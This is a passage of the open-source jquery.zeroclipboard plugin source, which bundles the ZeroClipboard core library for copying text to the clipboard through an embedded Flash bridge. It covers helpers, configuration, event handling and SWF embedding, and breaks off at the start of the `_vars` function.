/*!
 * jquery.zeroclipboard
 * Bind to the `beforecopy`, `copy`, `aftercopy`, and `copy-error` events, custom DOM-like events for clipboard injection generated using jQuery's Special Events API and ZeroClipboard's Core module.
 * Copyright (c) 2014
 * Licensed MIT
 * https://github.com/zeroclipboard/jquery.zeroclipboard
 * v0.2.0
 */
(function($, window, undefined) {
  "use strict";
  var require, module, exports;
  var zcExistsAlready = !!window.ZeroClipboard;
  /*!
 * ZeroClipboard
 * The ZeroClipboard library provides an easy way to copy text to the clipboard using an invisible Adobe Flash movie and a JavaScript interface.
 * Copyright (c) 2014 Jon Rohan, James M. Greene
 * Licensed MIT
 * http://zeroclipboard.org/
 * v2.1.2
 */
  (function(window, undefined) {
    /**
 * Store references to critically important global functions that may be
 * overridden on certain web pages.
 */
    var _window = window, _document = _window.document, _navigator = _window.navigator, _setTimeout = _window.setTimeout, _encodeURIComponent = _window.encodeURIComponent, _ActiveXObject = _window.ActiveXObject, _parseInt = _window.Number.parseInt || _window.parseInt, _parseFloat = _window.Number.parseFloat || _window.parseFloat, _isNaN = _window.Number.isNaN || _window.isNaN, _round = _window.Math.round, _now = _window.Date.now, _keys = _window.Object.keys, _defineProperty = _window.Object.defineProperty, _hasOwn = _window.Object.prototype.hasOwnProperty, _slice = _window.Array.prototype.slice;
    /**
 * Convert an `arguments` object into an Array.
 *
 * @returns The arguments as an Array
 * @private
 */
    var _args = function(argumentsObj) {
      return _slice.call(argumentsObj, 0);
    };
    /**
 * Shallow-copy the owned, enumerable properties of one object over to another, similar to jQuery's `$.extend`.
 *
 * @returns The target object, augmented
 * @private
 */
    var _extend = function() {
      var i, len, arg, prop, src, copy, args = _args(arguments), target = args[0] || {};
      for (i = 1, len = args.length; i < len; i++) {
        if ((arg = args[i]) != null) {
          for (prop in arg) {
            if (_hasOwn.call(arg, prop)) {
              src = target[prop];
              copy = arg[prop];
              if (target !== copy && copy !== undefined) {
                target[prop] = copy;
              }
            }
          }
        }
      }
      return target;
    };
    /**
 * Return a deep copy of the source object or array.
 *
 * @returns Object or Array
 * @private
 */
    var _deepCopy = function(source) {
      var copy, i, len, prop;
      if (typeof source !== "object" || source == null) {
        copy = source;
      } else if (typeof source.length === "number") {
        copy = [];
        for (i = 0, len = source.length; i < len; i++) {
          if (_hasOwn.call(source, i)) {
            copy[i] = _deepCopy(source[i]);
          }
        }
      } else {
        copy = {};
        for (prop in source) {
          if (_hasOwn.call(source, prop)) {
            copy[prop] = _deepCopy(source[prop]);
          }
        }
      }
      return copy;
    };
    /**
 * Makes a shallow copy of `obj` (like `_extend`) but filters its properties based on a list of `keys` to keep.
 * The inverse of `_omit`, mostly. The big difference is that these properties do NOT need to be enumerable to
 * be kept.
 *
 * @returns A new filtered object.
 * @private
 */
    var _pick = function(obj, keys) {
      var newObj = {};
      for (var i = 0, len = keys.length; i < len; i++) {
        if (keys[i] in obj) {
          newObj[keys[i]] = obj[keys[i]];
        }
      }
      return newObj;
    };
    /**
 * Makes a shallow copy of `obj` (like `_extend`) but filters its properties based on a list of `keys` to omit.
 * The inverse of `_pick`.
 *
 * @returns A new filtered object.
 * @private
 */
    var _omit = function(obj, keys) {
      var newObj = {};
      for (var prop in obj) {
        if (keys.indexOf(prop) === -1) {
          newObj[prop] = obj[prop];
        }
      }
      return newObj;
    };
    /**
 * Remove all owned, enumerable properties from an object.
 *
 * @returns The original object without its owned, enumerable properties.
 * @private
 */
    var _deleteOwnProperties = function(obj) {
      if (obj) {
        for (var prop in obj) {
          if (_hasOwn.call(obj, prop)) {
            delete obj[prop];
          }
        }
      }
      return obj;
    };
    /**
 * Determine if an element is contained within another element.
 *
 * @returns Boolean
 * @private
 */
    var _containedBy = function(el, ancestorEl) {
      if (el && el.nodeType === 1 && el.ownerDocument && ancestorEl && (ancestorEl.nodeType === 1 && ancestorEl.ownerDocument && ancestorEl.ownerDocument === el.ownerDocument || ancestorEl.nodeType === 9 && !ancestorEl.ownerDocument && ancestorEl === el.ownerDocument)) {
        do {
          if (el === ancestorEl) {
            return true;
          }
          el = el.parentNode;
        } while (el);
      }
      return false;
    };
    /**
 * Keep track of the state of the Flash object.
 * @private
 */
    var _flashState = {
      bridge: null,
      version: "0.0.0",
      pluginType: "unknown",
      disabled: null,
      outdated: null,
      unavailable: null,
      deactivated: null,
      overdue: null,
      ready: null
    };
    /**
 * The minimum Flash Player version required to use ZeroClipboard completely.
 * @readonly
 * @private
 */
    var _minimumFlashVersion = "11.0.0";
    /**
 * Keep track of all event listener registrations.
 * @private
 */
    var _handlers = {};
    /**
 * Keep track of the currently activated element.
 * @private
 */
    var _currentElement;
    /**
 * Keep track of data for the pending clipboard transaction.
 * @private
 */
    var _clipData = {};
    /**
 * Keep track of data formats for the pending clipboard transaction.
 * @private
 */
    var _clipDataFormatMap = null;
    /**
 * The `message` store for events
 * @private
 */
    var _eventMessages = {
      ready: "Flash communication is established",
      error: {
        "flash-disabled": "Flash is disabled or not installed",
        "flash-outdated": "Flash is too outdated to support ZeroClipboard",
        "flash-unavailable": "Flash is unable to communicate bidirectionally with JavaScript",
        "flash-deactivated": "Flash is too outdated for your browser and/or is configured as click-to-activate",
        "flash-overdue": "Flash communication was established but NOT within the acceptable time limit"
      }
    };
    /**
 * The presumed location of the "ZeroClipboard.swf" file, based on the location
 * of the executing JavaScript file (e.g. "ZeroClipboard.js", etc.).
 * @private
 */
    var _swfPath = function() {
      var i, jsDir, tmpJsPath, jsPath, swfPath = "ZeroClipboard.swf";
      if (!(_document.currentScript && (jsPath = _document.currentScript.src))) {
        var scripts = _document.getElementsByTagName("script");
        if ("readyState" in scripts[0]) {
          for (i = scripts.length; i--; ) {
            if (scripts[i].readyState === "interactive" && (jsPath = scripts[i].src)) {
              break;
            }
          }
        } else if (_document.readyState === "loading") {
          jsPath = scripts[scripts.length - 1].src;
        } else {
          for (i = scripts.length; i--; ) {
            tmpJsPath = scripts[i].src;
            if (!tmpJsPath) {
              jsDir = null;
              break;
            }
            tmpJsPath = tmpJsPath.split("#")[0].split("?")[0];
            tmpJsPath = tmpJsPath.slice(0, tmpJsPath.lastIndexOf("/") + 1);
            if (jsDir == null) {
              jsDir = tmpJsPath;
            } else if (jsDir !== tmpJsPath) {
              jsDir = null;
              break;
            }
          }
          if (jsDir !== null) {
            jsPath = jsDir;
          }
        }
      }
      if (jsPath) {
        jsPath = jsPath.split("#")[0].split("?")[0];
        swfPath = jsPath.slice(0, jsPath.lastIndexOf("/") + 1) + swfPath;
      }
      return swfPath;
    }();
    /**
 * ZeroClipboard configuration defaults for the Core module.
 * @private
 */
    var _globalConfig = {
      swfPath: _swfPath,
      trustedDomains: window.location.host ? [ window.location.host ] : [],
      cacheBust: true,
      forceEnhancedClipboard: false,
      flashLoadTimeout: 3e4,
      autoActivate: true,
      bubbleEvents: true,
      containerId: "global-zeroclipboard-html-bridge",
      containerClass: "global-zeroclipboard-container",
      swfObjectId: "global-zeroclipboard-flash-bridge",
      hoverClass: "zeroclipboard-is-hover",
      activeClass: "zeroclipboard-is-active",
      forceHandCursor: false,
      title: null,
      zIndex: 999999999
    };
    /**
 * The underlying implementation of `ZeroClipboard.config`.
 * @private
 */
    var _config = function(options) {
      if (typeof options === "object" && options !== null) {
        for (var prop in options) {
          if (_hasOwn.call(options, prop)) {
            if (/^(?:forceHandCursor|title|zIndex|bubbleEvents)$/.test(prop)) {
              _globalConfig[prop] = options[prop];
            } else if (_flashState.bridge == null) {
              if (prop === "containerId" || prop === "swfObjectId") {
                if (_isValidHtml4Id(options[prop])) {
                  _globalConfig[prop] = options[prop];
                } else {
                  throw new Error("The specified `" + prop + "` value is not valid as an HTML4 Element ID");
                }
              } else {
                _globalConfig[prop] = options[prop];
              }
            }
          }
        }
      }
      if (typeof options === "string" && options) {
        if (_hasOwn.call(_globalConfig, options)) {
          return _globalConfig[options];
        }
        return;
      }
      return _deepCopy(_globalConfig);
    };
    /**
 * The underlying implementation of `ZeroClipboard.state`.
 * @private
 */
    var _state = function() {
      return {
        browser: _pick(_navigator, [ "userAgent", "platform", "appName" ]),
        flash: _omit(_flashState, [ "bridge" ]),
        zeroclipboard: {
          version: ZeroClipboard.version,
          config: ZeroClipboard.config()
        }
      };
    };
    /**
 * The underlying implementation of `ZeroClipboard.isFlashUnusable`.
 * @private
 */
    var _isFlashUnusable = function() {
      return !!(_flashState.disabled || _flashState.outdated || _flashState.unavailable || _flashState.deactivated);
    };
    /**
 * The underlying implementation of `ZeroClipboard.on`.
 * @private
 */
    var _on = function(eventType, listener) {
      var i, len, events, added = {};
      if (typeof eventType === "string" && eventType) {
        events = eventType.toLowerCase().split(/\s+/);
      } else if (typeof eventType === "object" && eventType && typeof listener === "undefined") {
        for (i in eventType) {
          if (_hasOwn.call(eventType, i) && typeof i === "string" && i && typeof eventType[i] === "function") {
            ZeroClipboard.on(i, eventType[i]);
          }
        }
      }
      if (events && events.length) {
        for (i = 0, len = events.length; i < len; i++) {
          eventType = events[i].replace(/^on/, "");
          added[eventType] = true;
          if (!_handlers[eventType]) {
            _handlers[eventType] = [];
          }
          _handlers[eventType].push(listener);
        }
        if (added.ready && _flashState.ready) {
          ZeroClipboard.emit({
            type: "ready"
          });
        }
        if (added.error) {
          var errorTypes = [ "disabled", "outdated", "unavailable", "deactivated", "overdue" ];
          for (i = 0, len = errorTypes.length; i < len; i++) {
            if (_flashState[errorTypes[i]] === true) {
              ZeroClipboard.emit({
                type: "error",
                name: "flash-" + errorTypes[i]
              });
              break;
            }
          }
        }
      }
      return ZeroClipboard;
    };
    /**
 * The underlying implementation of `ZeroClipboard.off`.
 * @private
 */
    var _off = function(eventType, listener) {
      var i, len, foundIndex, events, perEventHandlers;
      if (arguments.length === 0) {
        events = _keys(_handlers);
      } else if (typeof eventType === "string" && eventType) {
        events = eventType.split(/\s+/);
      } else if (typeof eventType === "object" && eventType && typeof listener === "undefined") {
        for (i in eventType) {
          if (_hasOwn.call(eventType, i) && typeof i === "string" && i && typeof eventType[i] === "function") {
            ZeroClipboard.off(i, eventType[i]);
          }
        }
      }
      if (events && events.length) {
        for (i = 0, len = events.length; i < len; i++) {
          eventType = events[i].toLowerCase().replace(/^on/, "");
          perEventHandlers = _handlers[eventType];
          if (perEventHandlers && perEventHandlers.length) {
            if (listener) {
              foundIndex = perEventHandlers.indexOf(listener);
              while (foundIndex !== -1) {
                perEventHandlers.splice(foundIndex, 1);
                foundIndex = perEventHandlers.indexOf(listener, foundIndex);
              }
            } else {
              perEventHandlers.length = 0;
            }
          }
        }
      }
      return ZeroClipboard;
    };
    /**
 * The underlying implementation of `ZeroClipboard.handlers`.
 * @private
 */
    var _listeners = function(eventType) {
      var copy;
      if (typeof eventType === "string" && eventType) {
        copy = _deepCopy(_handlers[eventType]) || null;
      } else {
        copy = _deepCopy(_handlers);
      }
      return copy;
    };
    /**
 * The underlying implementation of `ZeroClipboard.emit`.
 * @private
 */
    var _emit = function(event) {
      var eventCopy, returnVal, tmp;
      event = _createEvent(event);
      if (!event) {
        return;
      }
      if (_preprocessEvent(event)) {
        return;
      }
      if (event.type === "ready" && _flashState.overdue === true) {
        return ZeroClipboard.emit({
          type: "error",
          name: "flash-overdue"
        });
      }
      eventCopy = _extend({}, event);
      _dispatchCallbacks.call(this, eventCopy);
      if (event.type === "copy") {
        tmp = _mapClipDataToFlash(_clipData);
        returnVal = tmp.data;
        _clipDataFormatMap = tmp.formatMap;
      }
      return returnVal;
    };
    /**
 * The underlying implementation of `ZeroClipboard.create`.
 * @private
 */
    var _create = function() {
      if (typeof _flashState.ready !== "boolean") {
        _flashState.ready = false;
      }
      if (!ZeroClipboard.isFlashUnusable() && _flashState.bridge === null) {
        var maxWait = _globalConfig.flashLoadTimeout;
        if (typeof maxWait === "number" && maxWait >= 0) {
          _setTimeout(function() {
            if (typeof _flashState.deactivated !== "boolean") {
              _flashState.deactivated = true;
            }
            if (_flashState.deactivated === true) {
              ZeroClipboard.emit({
                type: "error",
                name: "flash-deactivated"
              });
            }
          }, maxWait);
        }
        _flashState.overdue = false;
        _embedSwf();
      }
    };
    /**
 * The underlying implementation of `ZeroClipboard.destroy`.
 * @private
 */
    var _destroy = function() {
      ZeroClipboard.clearData();
      ZeroClipboard.blur();
      ZeroClipboard.emit("destroy");
      _unembedSwf();
      ZeroClipboard.off();
    };
    /**
 * The underlying implementation of `ZeroClipboard.setData`.
 * @private
 */
    var _setData = function(format, data) {
      var dataObj;
      if (typeof format === "object" && format && typeof data === "undefined") {
        dataObj = format;
        ZeroClipboard.clearData();
      } else if (typeof format === "string" && format) {
        dataObj = {};
        dataObj[format] = data;
      } else {
        return;
      }
      for (var dataFormat in dataObj) {
        if (typeof dataFormat === "string" && dataFormat && _hasOwn.call(dataObj, dataFormat) && typeof dataObj[dataFormat] === "string" && dataObj[dataFormat]) {
          _clipData[dataFormat] = dataObj[dataFormat];
        }
      }
    };
    /**
 * The underlying implementation of `ZeroClipboard.clearData`.
 * @private
 */
    var _clearData = function(format) {
      if (typeof format === "undefined") {
        _deleteOwnProperties(_clipData);
        _clipDataFormatMap = null;
      } else if (typeof format === "string" && _hasOwn.call(_clipData, format)) {
        delete _clipData[format];
      }
    };
    /**
 * The underlying implementation of `ZeroClipboard.getData`.
 * @private
 */
    var _getData = function(format) {
      if (typeof format === "undefined") {
        return _deepCopy(_clipData);
      } else if (typeof format === "string" && _hasOwn.call(_clipData, format)) {
        return _clipData[format];
      }
    };
    /**
 * The underlying implementation of `ZeroClipboard.focus`/`ZeroClipboard.activate`.
 * @private
 */
    var _focus = function(element) {
      if (!(element && element.nodeType === 1)) {
        return;
      }
      if (_currentElement) {
        _removeClass(_currentElement, _globalConfig.activeClass);
        if (_currentElement !== element) {
          _removeClass(_currentElement, _globalConfig.hoverClass);
        }
      }
      _currentElement = element;
      _addClass(element, _globalConfig.hoverClass);
      var newTitle = element.getAttribute("title") || _globalConfig.title;
      if (typeof newTitle === "string" && newTitle) {
        var htmlBridge = _getHtmlBridge(_flashState.bridge);
        if (htmlBridge) {
          htmlBridge.setAttribute("title", newTitle);
        }
      }
      var useHandCursor = _globalConfig.forceHandCursor === true || _getStyle(element, "cursor") === "pointer";
      _setHandCursor(useHandCursor);
      _reposition();
    };
    /**
 * The underlying implementation of `ZeroClipboard.blur`/`ZeroClipboard.deactivate`.
 * @private
 */
    var _blur = function() {
      var htmlBridge = _getHtmlBridge(_flashState.bridge);
      if (htmlBridge) {
        htmlBridge.removeAttribute("title");
        htmlBridge.style.left = "0px";
        htmlBridge.style.top = "-9999px";
        htmlBridge.style.width = "1px";
        htmlBridge.style.top = "1px";
      }
      if (_currentElement) {
        _removeClass(_currentElement, _globalConfig.hoverClass);
        _removeClass(_currentElement, _globalConfig.activeClass);
        _currentElement = null;
      }
    };
    /**
 * The underlying implementation of `ZeroClipboard.activeElement`.
 * @private
 */
    var _activeElement = function() {
      return _currentElement || null;
    };
    /**
 * Check if a value is a valid HTML4 `ID` or `Name` token.
 * @private
 */
    var _isValidHtml4Id = function(id) {
      return typeof id === "string" && id && /^[A-Za-z][A-Za-z0-9_:\-\.]*$/.test(id);
    };
    /**
 * Create or update an `event` object, based on the `eventType`.
 * @private
 */
    var _createEvent = function(event) {
      var eventType;
      if (typeof event === "string" && event) {
        eventType = event;
        event = {};
      } else if (typeof event === "object" && event && typeof event.type === "string" && event.type) {
        eventType = event.type;
      }
      if (!eventType) {
        return;
      }
      _extend(event, {
        type: eventType.toLowerCase(),
        target: event.target || _currentElement || null,
        relatedTarget: event.relatedTarget || null,
        currentTarget: _flashState && _flashState.bridge || null,
        timeStamp: event.timeStamp || _now() || null
      });
      var msg = _eventMessages[event.type];
      if (event.type === "error" && event.name && msg) {
        msg = msg[event.name];
      }
      if (msg) {
        event.message = msg;
      }
      if (event.type === "ready") {
        _extend(event, {
          target: null,
          version: _flashState.version
        });
      }
      if (event.type === "error") {
        if (/^flash-(disabled|outdated|unavailable|deactivated|overdue)$/.test(event.name)) {
          _extend(event, {
            target: null,
            minimumVersion: _minimumFlashVersion
          });
        }
        if (/^flash-(outdated|unavailable|deactivated|overdue)$/.test(event.name)) {
          _extend(event, {
            version: _flashState.version
          });
        }
      }
      if (event.type === "copy") {
        event.clipboardData = {
          setData: ZeroClipboard.setData,
          clearData: ZeroClipboard.clearData
        };
      }
      if (event.type === "aftercopy") {
        event = _mapClipResultsFromFlash(event, _clipDataFormatMap);
      }
      if (event.target && !event.relatedTarget) {
        event.relatedTarget = _getRelatedTarget(event.target);
      }
      event = _addMouseData(event);
      return event;
    };
    /**
 * Get a relatedTarget from the target's `data-clipboard-target` attribute
 * @private
 */
    var _getRelatedTarget = function(targetEl) {
      var relatedTargetId = targetEl && targetEl.getAttribute && targetEl.getAttribute("data-clipboard-target");
      return relatedTargetId ? _document.getElementById(relatedTargetId) : null;
    };
    /**
 * Add element and position data to `MouseEvent` instances
 * @private
 */
    var _addMouseData = function(event) {
      if (event && /^_(?:click|mouse(?:over|out|down|up|move))$/.test(event.type)) {
        var srcElement = event.target;
        var fromElement = event.type === "_mouseover" && event.relatedTarget ? event.relatedTarget : undefined;
        var toElement = event.type === "_mouseout" && event.relatedTarget ? event.relatedTarget : undefined;
        var pos = _getDOMObjectPosition(srcElement);
        var screenLeft = _window.screenLeft || _window.screenX || 0;
        var screenTop = _window.screenTop || _window.screenY || 0;
        var scrollLeft = _document.body.scrollLeft + _document.documentElement.scrollLeft;
        var scrollTop = _document.body.scrollTop + _document.documentElement.scrollTop;
        var pageX = pos.left + (typeof event._stageX === "number" ? event._stageX : 0);
        var pageY = pos.top + (typeof event._stageY === "number" ? event._stageY : 0);
        var clientX = pageX - scrollLeft;
        var clientY = pageY - scrollTop;
        var screenX = screenLeft + clientX;
        var screenY = screenTop + clientY;
        var moveX = typeof event.movementX === "number" ? event.movementX : 0;
        var moveY = typeof event.movementY === "number" ? event.movementY : 0;
        delete event._stageX;
        delete event._stageY;
        _extend(event, {
          srcElement: srcElement,
          fromElement: fromElement,
          toElement: toElement,
          screenX: screenX,
          screenY: screenY,
          pageX: pageX,
          pageY: pageY,
          clientX: clientX,
          clientY: clientY,
          x: clientX,
          y: clientY,
          movementX: moveX,
          movementY: moveY,
          offsetX: 0,
          offsetY: 0,
          layerX: 0,
          layerY: 0
        });
      }
      return event;
    };
    /**
 * Determine if an event's registered handlers should be execute synchronously or asynchronously.
 *
 * @returns {boolean}
 * @private
 */
    var _shouldPerformAsync = function(event) {
      var eventType = event && typeof event.type === "string" && event.type || "";
      return !/^(?:(?:before)?copy|destroy)$/.test(eventType);
    };
    /**
 * Control if a callback should be executed asynchronously or not.
 *
 * @returns `undefined`
 * @private
 */
    var _dispatchCallback = function(func, context, args, async) {
      if (async) {
        _setTimeout(function() {
          func.apply(context, args);
        }, 0);
      } else {
        func.apply(context, args);
      }
    };
    /**
 * Handle the actual dispatching of events to client instances.
 *
 * @returns `undefined`
 * @private
 */
    var _dispatchCallbacks = function(event) {
      if (!(typeof event === "object" && event && event.type)) {
        return;
      }
      var async = _shouldPerformAsync(event);
      var wildcardTypeHandlers = _handlers["*"] || [];
      var specificTypeHandlers = _handlers[event.type] || [];
      var handlers = wildcardTypeHandlers.concat(specificTypeHandlers);
      if (handlers && handlers.length) {
        var i, len, func, context, eventCopy, originalContext = this;
        for (i = 0, len = handlers.length; i < len; i++) {
          func = handlers[i];
          context = originalContext;
          if (typeof func === "string" && typeof _window[func] === "function") {
            func = _window[func];
          }
          if (typeof func === "object" && func && typeof func.handleEvent === "function") {
            context = func;
            func = func.handleEvent;
          }
          if (typeof func === "function") {
            eventCopy = _extend({}, event);
            _dispatchCallback(func, context, [ eventCopy ], async);
          }
        }
      }
      return this;
    };
    /**
 * Preprocess any special behaviors, reactions, or state changes after receiving this event.
 * Executes only once per event emitted, NOT once per client.
 * @private
 */
    var _preprocessEvent = function(event) {
      var element = event.target || _currentElement || null;
      var sourceIsSwf = event._source === "swf";
      delete event._source;
      var flashErrorNames = [ "flash-disabled", "flash-outdated", "flash-unavailable", "flash-deactivated", "flash-overdue" ];
      switch (event.type) {
       case "error":
        if (flashErrorNames.indexOf(event.name) !== -1) {
          _extend(_flashState, {
            disabled: event.name === "flash-disabled",
            outdated: event.name === "flash-outdated",
            unavailable: event.name === "flash-unavailable",
            deactivated: event.name === "flash-deactivated",
            overdue: event.name === "flash-overdue",
            ready: false
          });
        }
        break;

       case "ready":
        var wasDeactivated = _flashState.deactivated === true;
        _extend(_flashState, {
          disabled: false,
          outdated: false,
          unavailable: false,
          deactivated: false,
          overdue: wasDeactivated,
          ready: !wasDeactivated
        });
        break;

       case "copy":
        var textContent, htmlContent, targetEl = event.relatedTarget;
        if (!(_clipData["text/html"] || _clipData["text/plain"]) && targetEl && (htmlContent = targetEl.value || targetEl.outerHTML || targetEl.innerHTML) && (textContent = targetEl.value || targetEl.textContent || targetEl.innerText)) {
          event.clipboardData.clearData();
          event.clipboardData.setData("text/plain", textContent);
          if (htmlContent !== textContent) {
            event.clipboardData.setData("text/html", htmlContent);
          }
        } else if (!_clipData["text/plain"] && event.target && (textContent = event.target.getAttribute("data-clipboard-text"))) {
          event.clipboardData.clearData();
          event.clipboardData.setData("text/plain", textContent);
        }
        break;

       case "aftercopy":
        ZeroClipboard.clearData();
        if (element && element !== _safeActiveElement() && element.focus) {
          element.focus();
        }
        break;

       case "_mouseover":
        ZeroClipboard.focus(element);
        if (_globalConfig.bubbleEvents === true && sourceIsSwf) {
          if (element && element !== event.relatedTarget && !_containedBy(event.relatedTarget, element)) {
            _fireMouseEvent(_extend({}, event, {
              type: "mouseenter",
              bubbles: false,
              cancelable: false
            }));
          }
          _fireMouseEvent(_extend({}, event, {
            type: "mouseover"
          }));
        }
        break;

       case "_mouseout":
        ZeroClipboard.blur();
        if (_globalConfig.bubbleEvents === true && sourceIsSwf) {
          if (element && element !== event.relatedTarget && !_containedBy(event.relatedTarget, element)) {
            _fireMouseEvent(_extend({}, event, {
              type: "mouseleave",
              bubbles: false,
              cancelable: false
            }));
          }
          _fireMouseEvent(_extend({}, event, {
            type: "mouseout"
          }));
        }
        break;

       case "_mousedown":
        _addClass(element, _globalConfig.activeClass);
        if (_globalConfig.bubbleEvents === true && sourceIsSwf) {
          _fireMouseEvent(_extend({}, event, {
            type: event.type.slice(1)
          }));
        }
        break;

       case "_mouseup":
        _removeClass(element, _globalConfig.activeClass);
        if (_globalConfig.bubbleEvents === true && sourceIsSwf) {
          _fireMouseEvent(_extend({}, event, {
            type: event.type.slice(1)
          }));
        }
        break;

       case "_click":
       case "_mousemove":
        if (_globalConfig.bubbleEvents === true && sourceIsSwf) {
          _fireMouseEvent(_extend({}, event, {
            type: event.type.slice(1)
          }));
        }
        break;
      }
      if (/^_(?:click|mouse(?:over|out|down|up|move))$/.test(event.type)) {
        return true;
      }
    };
    /**
 * Dispatch a synthetic MouseEvent.
 *
 * @returns `undefined`
 * @private
 */
    var _fireMouseEvent = function(event) {
      if (!(event && typeof event.type === "string" && event)) {
        return;
      }
      var e, target = event.target || null, doc = target && target.ownerDocument || _document, defaults = {
        view: doc.defaultView || _window,
        canBubble: true,
        cancelable: true,
        detail: event.type === "click" ? 1 : 0,
        button: typeof event.which === "number" ? event.which - 1 : typeof event.button === "number" ? event.button : doc.createEvent ? 0 : 1
      }, args = _extend(defaults, event);
      if (!target) {
        return;
      }
      if (doc.createEvent && target.dispatchEvent) {
        args = [ args.type, args.canBubble, args.cancelable, args.view, args.detail, args.screenX, args.screenY, args.clientX, args.clientY, args.ctrlKey, args.altKey, args.shiftKey, args.metaKey, args.button, args.relatedTarget ];
        e = doc.createEvent("MouseEvents");
        if (e.initMouseEvent) {
          e.initMouseEvent.apply(e, args);
          e._source = "js";
          target.dispatchEvent(e);
        }
      }
    };
    /**
 * Create the HTML bridge element to embed the Flash object into.
 * @private
 */
    var _createHtmlBridge = function() {
      var container = _document.createElement("div");
      container.id = _globalConfig.containerId;
      container.className = _globalConfig.containerClass;
      container.style.position = "absolute";
      container.style.left = "0px";
      container.style.top = "-9999px";
      container.style.width = "1px";
      container.style.height = "1px";
      container.style.zIndex = "" + _getSafeZIndex(_globalConfig.zIndex);
      return container;
    };
    /**
 * Get the HTML element container that wraps the Flash bridge object/element.
 * @private
 */
    var _getHtmlBridge = function(flashBridge) {
      var htmlBridge = flashBridge && flashBridge.parentNode;
      while (htmlBridge && htmlBridge.nodeName === "OBJECT" && htmlBridge.parentNode) {
        htmlBridge = htmlBridge.parentNode;
      }
      return htmlBridge || null;
    };
    /**
 * Create the SWF object.
 *
 * @returns The SWF object reference.
 * @private
 */
    var _embedSwf = function() {
      var len, flashBridge = _flashState.bridge, container = _getHtmlBridge(flashBridge);
      if (!flashBridge) {
        var allowScriptAccess = _determineScriptAccess(_window.location.host, _globalConfig);
        var allowNetworking = allowScriptAccess === "never" ? "none" : "all";
        var flashvars = _vars(_globalConfig);
        var swfUrl = _globalConfig.swfPath + _cacheBust(_globalConfig.swfPath, _globalConfig);
        container = _createHtmlBridge();
        var divToBeReplaced = _document.createElement("div");
        container.appendChild(divToBeReplaced);
        _document.body.appendChild(container);
        var tmpDiv = _document.createElement("div");
        var oldIE = _flashState.pluginType === "activex";
        tmpDiv.innerHTML = '<object id="' + _globalConfig.swfObjectId + '" name="' + _globalConfig.swfObjectId + '" ' + 'width="100%" height="100%" ' + (oldIE ? 'classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"' : 'type="application/x-shockwave-flash" data="' + swfUrl + '"') + ">" + (oldIE ? '<param name="movie" value="' + swfUrl + '"/>' : "") + '<param name="allowScriptAccess" value="' + allowScriptAccess + '"/>' + '<param name="allowNetworking" value="' + allowNetworking + '"/>' + '<param name="menu" value="false"/>' + '<param name="wmode" value="transparent"/>' + '<param name="flashvars" value="' + flashvars + '"/>' + "</object>";
        flashBridge = tmpDiv.firstChild;
        tmpDiv = null;
        flashBridge.ZeroClipboard = ZeroClipboard;
        container.replaceChild(flashBridge, divToBeReplaced);
      }
      if (!flashBridge) {
        flashBridge = _document[_globalConfig.swfObjectId];
        if (flashBridge && (len = flashBridge.length)) {
          flashBridge = flashBridge[len - 1];
        }
        if (!flashBridge && container) {
          flashBridge = container.firstChild;
        }
      }
      _flashState.bridge = flashBridge || null;
      return flashBridge;
    };
    /**
 * Destroy the SWF object.
 * @private
 */
    var _unembedSwf = function() {
      var flashBridge = _flashState.bridge;
      if (flashBridge) {
        var htmlBridge = _getHtmlBridge(flashBridge);
        if (htmlBridge) {
          if (_flashState.pluginType === "activex" && "readyState" in flashBridge) {
            flashBridge.style.display = "none";
            (function removeSwfFromIE() {
              if (flashBridge.readyState === 4) {
                for (var prop in flashBridge) {
                  if (typeof flashBridge[prop] === "function") {
                    flashBridge[prop] = null;
                  }
                }
                if (flashBridge.parentNode) {
                  flashBridge.parentNode.removeChild(flashBridge);
                }
                if (htmlBridge.parentNode) {
                  htmlBridge.parentNode.removeChild(htmlBridge);
                }
              } else {
                _setTimeout(removeSwfFromIE, 10);
              }
            })();
          } else {
            if (flashBridge.parentNode) {
              flashBridge.parentNode.removeChild(flashBridge);
            }
            if (htmlBridge.parentNode) {
              htmlBridge.parentNode.removeChild(htmlBridge);
            }
          }
        }
        _flashState.ready = null;
        _flashState.bridge = null;
        _flashState.deactivated = null;
      }
    };
    /**
 * Map the data format names of the "clipData" to Flash-friendly names.
 *
 * @returns A new transformed object.
 * @private
 */
    var _mapClipDataToFlash = function(clipData) {
      var newClipData = {}, formatMap = {};
      if (!(typeof clipData === "object" && clipData)) {
        return;
      }
      for (var dataFormat in clipData) {
        if (dataFormat && _hasOwn.call(clipData, dataFormat) && typeof clipData[dataFormat] === "string" && clipData[dataFormat]) {
          switch (dataFormat.toLowerCase()) {
           case "text/plain":
           case "text":
           case "air:text":
           case "flash:text":
            newClipData.text = clipData[dataFormat];
            formatMap.text = dataFormat;
            break;

           case "text/html":
           case "html":
           case "air:html":
           case "flash:html":
            newClipData.html = clipData[dataFormat];
            formatMap.html = dataFormat;
            break;

           case "application/rtf":
           case "text/rtf":
           case "rtf":
           case "richtext":
           case "air:rtf":
           case "flash:rtf":
            newClipData.rtf = clipData[dataFormat];
            formatMap.rtf = dataFormat;
            break;

           default:
            break;
          }
        }
      }
      return {
        data: newClipData,
        formatMap: formatMap
      };
    };
    /**
 * Map the data format names from Flash-friendly names back to their original "clipData" names (via a format mapping).
 *
 * @returns A new transformed object.
 * @private
 */
    var _mapClipResultsFromFlash = function(clipResults, formatMap) {
      if (!(typeof clipResults === "object" && clipResults && typeof formatMap === "object" && formatMap)) {
        return clipResults;
      }
      var newResults = {};
      for (var prop in clipResults) {
        if (_hasOwn.call(clipResults, prop)) {
          if (prop !== "success" && prop !== "data") {
            newResults[prop] = clipResults[prop];
            continue;
          }
          newResults[prop] = {};
          var tmpHash = clipResults[prop];
          for (var dataFormat in tmpHash) {
            if (dataFormat && _hasOwn.call(tmpHash, dataFormat) && _hasOwn.call(formatMap, dataFormat)) {
              newResults[prop][formatMap[dataFormat]] = tmpHash[dataFormat];
            }
          }
        }
      }
      return newResults;
    };
    /**
 * Will look at a path, and will create a "?noCache={time}" or "&noCache={time}"
 * query param string to return. Does NOT append that string to the original path.
 * This is useful because ExternalInterface often breaks when a Flash SWF is cached.
 *
 * @returns The `noCache` query param with necessary "?"/"&" prefix.
 * @private
 */
    var _cacheBust = function(path, options) {
      var cacheBust = options == null || options && options.cacheBust === true;
      if (cacheBust) {
        return (path.indexOf("?") === -1 ? "?" : "&") + "noCache=" + _now();
      } else {
        return "";
      }
    };
    /**
 * Creates a query string for the FlashVars param.
 * Does NOT include the cache-busting query param.
 *
 * @returns FlashVars query string
 * @private
 */
    var _vars = function(options) {
